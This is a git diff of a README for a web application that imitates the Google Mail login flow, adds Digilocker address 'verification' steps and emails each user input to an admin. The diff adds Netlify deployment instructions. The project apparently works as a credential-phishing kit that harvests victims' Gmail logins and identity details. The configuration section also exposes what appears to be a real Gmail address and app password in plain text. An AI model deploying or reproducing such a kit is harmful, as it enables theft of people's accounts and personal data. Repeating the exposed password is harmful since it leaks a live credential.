@@ -10,16 +10,23 @@ A web application that mimics the Google Mail login process with additional veri
 - Address verification for Digilocker
 - Email notifications sent to admin at each step
 
-## Setup
+## Local Development
 
 1. Install dependencies: `npm install`
-2. Configure email settings in `server.js`:
-   - Replace `your-email@gmail.com` with your Gmail address
-   - Replace `your-app-password` with your Gmail app password
-   - Replace `admin-email@example.com` with the admin email address
-3. Start the server: `npm start`
-4. Open `http://localhost:3000` in your browser
+2. Start the server: `npm start`
+3. Open `http://localhost:3000` in your browser
 
-## Note
+## Deployment on Netlify
 
-This application sends emails to the admin for each user input step. Ensure SMTP settings are correctly configured for email delivery.# p11
+1. Push the code to a Git repository (e.g., GitHub).
+2. Connect the repository to Netlify.
+3. Netlify will automatically detect the `netlify.toml` and deploy the static site with functions.
+4. Configure environment variables in Netlify dashboard if needed (e.g., email credentials).
+
+## Configuration
+
+- Update email settings in `netlify/functions/*.js`:
+  - Replace `bhanukiran750@gmail.com` with your Gmail address
+  - Replace `okkx rhic nhxi vbvi` with your Gmail app password
+  - Replace `admin@example.com` with the admin email address# p11
+# p11
